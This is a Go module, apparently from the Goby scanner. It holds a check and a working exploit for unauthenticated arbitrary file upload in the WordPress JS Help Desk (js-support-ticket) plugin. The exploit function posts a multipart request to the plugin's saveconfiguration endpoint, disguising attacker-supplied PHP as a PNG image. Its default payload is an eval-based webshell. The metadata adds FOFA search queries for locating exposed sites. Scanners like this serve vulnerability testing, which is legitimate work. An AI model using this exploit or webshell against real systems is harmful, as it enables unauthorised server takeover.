package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin js-support-ticket File Upload Vulnerability",
    "Description": "<p>JS Help Desk is a professional, simple, easy to use and complete customer support system. JS Help Desk comes packed with lot features than most of the expensive(and complex) support ticket system on market.</p><p>JS Help Desk &lt;= 2.7.1 Unauthenticated Arbitrary File Upload.</p>",
    "Product": "wordpress-plugin-js-support-ticket",
    "Homepage": "https://wordpress.org/plugins/js-support-ticket/",
    "DisclosureDate": "2023-01-27",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/js-support-ticket\"",
    "GobyQuery": "body=\"wp-content/plugins/js-support-ticket\"",
    "Level": "3",
    "Impact": "<p>An attacker can use the uploaded malicious script file to control the whole website or even control the server. This malicious script file, also known as WebShell, can also be referred to as a kind of web backdoor. WebShell scripts have very powerful functions, such as viewing server directories, files in the server, executing system commands, etc.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/js-support-ticket/\">https://wordpress.org/plugins/js-support-ticket/</a></p>",
    "References": [
        "https://patchstack.com/database/vulnerability/js-support-ticket/wordpress-js-help-desk-plugin-2-7-1-arbitrary-file-upload-vulnerability"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php @eval($_POST['cutgkjxy']);?>",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress js-support-ticket 插件 saveconfiguration 功能文件上传漏洞",
            "Product": "wordpress-plugin-js-support-ticket",
            "Description": "<p>JS Help Desk是一个专业、简单、易用且完整的客户支持系统。 与市场上大多数昂贵（且复杂）的支持票系统相比，JS Help Desk 具有许多功能。</p><p>JS Help Desk &lt;= 2.7.1存在未授权上传漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/js-support-ticket/\">https://wordpress.org/plugins/js-support-ticket/</a><br></p>",
            "Impact": "<p>攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。<br><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin js-support-ticket File Upload Vulnerability",
            "Product": "wordpress-plugin-js-support-ticket",
            "Description": "<p>JS Help Desk is a professional, simple, easy to use and complete customer support system. JS Help Desk comes packed with lot features than most of the expensive(and complex) support ticket system on market.<br></p><p>JS Help Desk &lt;= 2.7.1 Unauthenticated Arbitrary File Upload.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/js-support-ticket/\">https://wordpress.org/plugins/js-support-ticket/</a><br></p>",
            "Impact": "<p>An attacker can use the uploaded malicious script file to control the whole website or even control the server. This malicious script file, also known as WebShell, can also be referred to as a kind of web backdoor. WebShell scripts have very powerful functions, such as viewing server directories, files in the server, executing system commands, etc.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			random_filename := goutils.RandomHexString(6)
			fileContent := "<?php echo md5(123456789);unlink(__FILE__);?>"
			cfg := httpclient.NewPostRequestConfig("/wp-admin/?page=configuration&task=saveconfiguration")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------767099171")
			cfg.Data += "----------767099171\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"action\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "configuration_saveconfiguration\r\n"
			cfg.Data += "----------767099171\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"form_request\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "jssupportticket\r\n"
			cfg.Data += "----------767099171\r\n"
			cfg.Data += fmt.Sprintf("Content-Disposition: form-data; name=\"support_custom_img\"; filename=\"%s.php\"\r\n", random_filename)
			cfg.Data += "Content-Type: image/png\r\n"
			cfg.Data += "\r\n"
			cfg.Data += fmt.Sprintf("%s\r\n", fileContent)
			cfg.Data += "----------767099171--"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				upload_path := fmt.Sprintf("/wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/%s.php", random_filename)
				cfg_upload := httpclient.NewGetRequestConfig(upload_path)
				cfg_upload.VerifyTls = false
				cfg_upload.FollowRedirect = false
				if response_upload, err_upload := httpclient.DoHttpRequest(u, cfg_upload); err_upload == nil {
					if strings.Contains(response_upload.RawBody, "25f9e794323b453885f5181f1b624d0b") {
						return true
					} else {
						return false
					}
				}
				return false
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			random_filename := goutils.RandomHexString(6)
			fileContent := ss.Params["fileContent"].(string)
			cfg := httpclient.NewPostRequestConfig("/wp-admin/?page=configuration&task=saveconfiguration")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------767099171")
			cfg.Data += "----------767099171\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"action\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "configuration_saveconfiguration\r\n"
			cfg.Data += "----------767099171\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"form_request\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "jssupportticket\r\n"
			cfg.Data += "----------767099171\r\n"
			cfg.Data += fmt.Sprintf("Content-Disposition: form-data; name=\"support_custom_img\"; filename=\"%s.php\"\r\n", random_filename)
			cfg.Data += "Content-Type: image/png\r\n"
			cfg.Data += "\r\n"
			cfg.Data += fmt.Sprintf("%s\r\n", fileContent)
			cfg.Data += "----------767099171--"
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				uplpad_path := fmt.Sprintf("/wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/%s.php", random_filename)
				expResult.Success = true
				expResult.Output += fmt.Sprintf("文件写入成功，地址：%s%s", expResult.HostInfo, uplpad_path)
			}
			return expResult
		},
	))
}